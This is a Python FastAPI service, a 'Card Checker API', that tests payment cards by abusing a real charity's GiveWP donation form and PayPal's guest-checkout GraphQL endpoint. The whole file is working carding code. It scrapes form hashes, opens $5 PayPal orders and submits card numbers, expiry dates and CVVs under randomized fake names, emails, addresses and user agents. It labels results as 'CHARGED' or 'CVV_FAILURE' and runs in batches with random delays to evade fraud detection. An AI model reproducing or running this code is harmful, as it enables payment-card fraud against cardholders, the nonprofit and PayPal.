import re
import requests
from fake_useragent import UserAgent
from faker import Faker
import json
import random
import time
import asyncio
from colorama import Fore
from datetime import datetime
from fastapi import HTTPException
from pydantic import BaseModel
from typing import Optional
import uvicorn
from killer import app

Z = '\033[1;31m'
F = '\033[2;32m'
GRAY = '\033[1;30m'
ORANGE = '\033[38;5;208m'
RESET = '\033[0m'

# Uncommon names to randomize
UNCOMMON_FIRST_NAMES = [
    "Ezra", "Silas", "Thaddeus", "Leander", "Cornelius", "Beauregard", "Percival",
    "Matthias", "Augustine", "Octavius", "Caspian", "Orson", "Merrick", "Dashiell",
    "Alistair", "Bowen", "Casimir", "Dexter", "Emerson", "Flemming", "Gideon",
    "Henryk", "Ignatius", "Jasper", "Klaus", "Leroy", "Maverick", "Nolan",
    "Oberon", "Phineas", "Quincy", "Rasmus", "Seamus", "Theron", "Ulysses",
    "Valentino", "Wolfgang", "Xander", "Yarrow", "Zephyr", "Aileron", "Brodrick",
    "Calloway", "Darby", "Edison", "Finley", "Gaston", "Hadrian", "Isidore"
]

UNCOMMON_LAST_NAMES = [
    "Wickham", "Ashford", "Whitmore", "Pembroke", "Blackwell", "Thornton", "Beaumont",
    "Cheltenham", "Dalrymple", "Etheridge", "Fairfax", "Grayson", "Harrington", "Iverson",
    "Jamison", "Kensington", "Lockwood", "Mansfield", "Northwick", "Osborne", "Prescott",
    "Queensbury", "Ridgeway", "Somerfield", "Talmadge", "Underwood", "Vanderbilt", "Westbrook",
    "Xanthippe", "Yarborough", "Zelinski", "Ashby", "Blakeley", "Cromwell", "Dalton",
    "Elmsworth", "Foxworth", "Gainsborough", "Hackett", "Ingersoll", "Jocelyn", "Keaton"
]



# Request/Response Models
class CardRequest(BaseModel):
    num: str
    mon: str
    yer: str
    cvc: str

class CheckResponse(BaseModel):
    card_number: str
    status: str
    message: str
    details: Optional[dict] = None

# Queue to handle concurrent requests without overlapping
check_queue = asyncio.Queue()
MAX_CONCURRENT = 1  # Process one card at a time to avoid overlapping

def generate_random_email(fake=None):
    """Generate random email with numbers to avoid account restrictions"""
    first_part = get_uncommon_first_name().lower() + str(random.randint(100000, 999999))
    second_part = get_uncommon_last_name().lower() + str(random.randint(10000, 99999))
    third_part = str(random.randint(100000, 999999))
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "mail.com", "icloud.com", "aol.com", "tutanota.com"]
    domain = random.choice(domains)
    return f"{first_part}_{second_part}_{third_part}@{domain}"

def get_uncommon_first_name():
    """Get random uncommon first name"""
    return random.choice(UNCOMMON_FIRST_NAMES)

def get_uncommon_last_name():
    """Get random uncommon last name"""
    return random.choice(UNCOMMON_LAST_NAMES)

def info_requests():
    us = UserAgent().random
    r = requests.Session()
    fake = Faker()
    return us, r, fake

def var_response_msg(us, r):
    url = "https://www.brightercommunities.org/donate-form/"
    headers = {'User-Agent': us}
    
    try:
        response = r.get(url, headers=headers, timeout=10)
        hash = re.findall(r'(?<=name="give-form-hash" value=").*?(?=")', response.text)[0]
        form_id = re.findall(r'(?<=name="give-form-id" value=").*?(?=")', response.text)[0]
        prefix = re.findall(r'(?<=name="give-form-id-prefix" value=").*?(?=")', response.text)[0]
        
        if not hash or not form_id or not prefix:
            return None, None, None
        return hash, form_id, prefix
    except Exception as e:
        print(f"Error in var_response_msg: {e}")
        return None, None, None

def requests_id(us, r, fake, hash, form_id, prefix):
    url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
    
    payload = {
        'give-form-id-prefix': prefix,
        'give-form-id': form_id,
        'give-form-minimum': '5.00',
        'give-form-hash': hash,
        'give-amount': '5.00',
        'give_first': get_uncommon_first_name(),
        'give_last': get_uncommon_last_name(),
        'give_email': generate_random_email(fake)
    }
    
    headers = {'User-Agent': us}
    
    try:
        response = r.post(url, data=payload, headers=headers, timeout=10)
        id = response.json()["data"]["id"]
        return id
    except Exception as e:
        print(f"Error in requests_id: {e}")
        return None

def info_cards(card):
    c = card["num"]
    info_card = {
        '3': 'JCB',
        '4': 'VISA',
        '5': 'MASTER_CARD',
        '6': 'DISCOVER'
    }.get(c[0], "Unknown card type")
    return info_card

def response_msg(card, us, r, fake, id, info_card):
    url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
    
    payload = {
        "query": "\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ",
        "variables": {
            "token": id,
            "card": {
                "cardNumber": card["num"],
                "type": info_card,
                "expirationDate": card["mon"] + '/20' + card["yer"],
                "postalCode": fake.zipcode(),
                "securityCode": card["cvc"],
            },
            "phoneNumber": fake.phone_number(),
            "firstName": get_uncommon_first_name(),
            "lastName": get_uncommon_last_name(),
            "billingAddress": {
                "givenName": get_uncommon_first_name(),
                "familyName": get_uncommon_last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "shippingAddress": {
                "givenName": get_uncommon_first_name(),
                "familyName": get_uncommon_last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "email": generate_random_email(fake),
            "currencyConversionType": "PAYPAL"
        },
        "operationName": None
    }
    
    headers = {'User-Agent': us, 'Content-Type': "application/json"}
    
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        time.sleep(random.randint(2, 5))
        return response.text
    except Exception as e:
        print(f"Error in response_msg: {e}")
        return str(e)

def parse_response(card, text_paypal, fake):
    card_info = f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}"
    
    if "accessToken" in text_paypal or "cartId" in text_paypal:
        status = "CHARGED"
        msg = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 5.00$ ❇️"
    elif "INVALID_SECURITY_CODE" in text_paypal:
        status = "CVV_FAILURE"
        msg = "CVV2_FAILURE! ❇️"
    elif "GRAPHQL_VALIDATION_FAILED" in text_paypal:
        status = "VALIDATION_FAILED"
        msg = "GRAPHQL_VALIDATION_FAILED"
    elif "EXISTING_ACCOUNT_RESTRICTED" in text_paypal:
        status = "ACCOUNT_RESTRICTED"
        msg = "EXISTING ACCOUNT RESTRICTED!"
    elif "RISK_DISALLOWED" in text_paypal:
        status = "RISK_DISALLOWED"
        msg = "RISK_DISALLOWED"
    elif "ISSUER_DATA_NOT_FOUND" in text_paypal:
        status = "DATA_NOT_FOUND"
        msg = "ISSUER_DATA_NOT_FOUND"
    elif "INVALID_BILLING_ADDRESS" in text_paypal:
        status = "INSUFFICIENT_FUNDS"
        msg = "INSUFFICIENT_FUNDS! ❇️"
    elif "R_ERROR" in text_paypal:
        status = "GENERIC_ERROR"
        msg = "CARD_GENERIC_ERROR"
    elif "ISSUER_DECLINE" in text_paypal:
        status = "ISSUER_DECLINE"
        msg = "ISSUER_DECLINE"
    elif "EXPIRED_CARD" in text_paypal:
        status = "EXPIRED"
        msg = "EXPIRED_CARD"
    elif "LOGIN_ERROR" in text_paypal:
        status = "LOGIN_ERROR"
        msg = "LOGIN_ERROR"
    elif "VALIDATION_ERROR" in text_paypal:
        status = "VALIDATION_ERROR"
        msg = "VALIDATION_ERROR"
    else:
        status = "UNKNOWN"
        msg = text_paypal[:100]
    
    return {
        "card_number": card_info,
        "status": status,
        "message": msg,
        "details": {
            "first_name": get_uncommon_first_name(),
            "last_name": get_uncommon_last_name(),
            "email": generate_random_email(fake),
            "timestamp": datetime.now().isoformat()
        }
    }

async def check_card(card: dict):
    """Process a single card check"""
    try:
        time.sleep(random.randint(1, 3))
        
        us, r, fake = info_requests()
        hash, form_id, prefix = var_response_msg(us, r)
        
        if not hash or not form_id or not prefix:
            return {
                "card_number": f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}",
                "status": "FAILED",
                "message": "Could not retrieve form data"
            }
        
        id = requests_id(us, r, fake, hash, form_id, prefix)
        
        if not id:
            return {
                "card_number": f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}",
                "status": "FAILED",
                "message": "Could not retrieve payment token"
            }
        
        info_card = info_cards(card)
        text_paypal = response_msg(card, us, r, fake, id, info_card)
        
        result = parse_response(card, text_paypal, fake)
        return result
    
    except Exception as e:
        return {
            "card_number": f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}",
            "status": "ERROR",
            "message": str(e)
        }

# API Endpoints
@app.post("/check", response_model=CheckResponse)
async def check_single_card(card: CardRequest):
    """Check a single card - processes sequentially to avoid overlapping"""
    try:
        result = await check_card(card.dict())
        return CheckResponse(**result)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/check-batch")
async def check_batch(cards: list[CardRequest]):
    """Check multiple cards - queued to process without overlapping"""
    results = []
    
    for card in cards:
        result = await check_card(card.dict())
        results.append(result)
        time.sleep(random.randint(6, 10))  # Delay between checks
    
    return {
        "total": len(cards),
        "results": results,
        "timestamp": datetime.now().isoformat()
    }

@app.get("/health")
async def health():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "timestamp": datetime.now().isoformat()
    }

@app.get("/")
async def root():
    """API information"""
    return {
        "name": "Card Checker API",
        "version": "1.0.0",
        "endpoints": {
            "check": "POST /check - Check a single card",
            "killer": "GET /kill",
            "check_batch": "POST /check-batch - Check multiple cards",
            "health": "GET /health - Health check",
            "docs": "GET /docs - Interactive API documentation"
        }
    }
